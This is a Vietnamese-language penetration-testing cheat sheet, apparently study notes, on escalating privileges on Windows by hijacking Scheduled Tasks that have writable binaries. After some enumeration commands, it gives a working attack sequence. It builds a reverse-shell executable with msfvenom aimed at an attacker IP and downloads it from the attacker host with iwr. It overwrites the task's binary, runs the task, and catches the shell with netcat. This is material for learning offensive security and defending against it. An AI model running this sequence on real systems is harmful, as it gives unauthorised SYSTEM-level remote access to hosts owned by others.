# Schedule Tasks

## Điểm chính khai thác

* Khai thác các Scheduled Tasks trên Windows để nâng quyền bằng cách thay thế các file thực thi có thể ghi trong các tác vụ chạy với quyền SYSTEM hoặc tài khoản quản trị.
* Tác vụ chạy trong thư mục do người dùng kiểm soát hoặc có quyền ghi là mục tiêu chính để triển khai payload độc hại.
* Tác vụ chạy thường xuyên (ví dụ: mỗi phút) cho phép khai thác nhanh mà không cần kích hoạt thủ công.
* Quyền thực thi của tác vụ (Run As User) quyết định mức độ đặc quyền thu được, với SYSTEM là tối ưu cho leo thang toàn diện.
* Sao lưu file gốc và kiểm tra quyền là cần thiết để đảm bảo khai thác không gây gián đoạn.

***

## Các bước khai thác

### Kiểm tra lỗ hổng

Liệt kê tất cả Scheduled Tasks để tìm các tác vụ có nhị phân trong thư mục do người dùng kiểm soát hoặc chạy với quyền cao:

```
schtasks /query /fo LIST /v
```

Liệt kê chi tiết các tác vụ để xác định đường dẫn nhị phân và quyền thực thi:

```
Get-ScheduledTask | ForEach-Object { $_.Actions }
```

Kiểm tra quyền trên nhị phân của tác vụ để xác định khả năng ghi đè:

```
icacls <path_to_file>
```

Kiểm tra quyền trên thư mục chứa nhị phân để đảm bảo khả năng ghi:

```
icacls <path>
```

***

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo reverse shell để thay thế tác vụ:

{% code overflow="wrap" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o shell.exe
```

{% endcode %}

Sao lưu nhị phân gốc để tránh làm hỏng hệ thống:

```
move .\<file>.exe .\<file>.exe.bak
```

#### Áp dụng khai thác

Tải payload từ máy chủ kiểm soát để thay thế file thực thi của tác vụ:

```
iwr -Uri http://<kali_ip>/shell.exe -OutFile <file>.exe
```

Triển khai payload vào đường dẫn của tác vụ:

```
move .\<file>.exe <path>
```

{% hint style="info" %}
Yêu cầu quyền Modify (M) hoặc Full (F) trên đường dẫn bằng `icacls`.
{% endhint %}

#### Kích hoạt khai thác

Kích hoạt thủ công tác vụ nếu được phép để thực thi payload hoặc đợi đến lịch:

```
schtasks /run /tn <task>
```

Chờ kết nối reverse shell sau khi tác vụ thực thi:

```
nc -lvnp 443
```
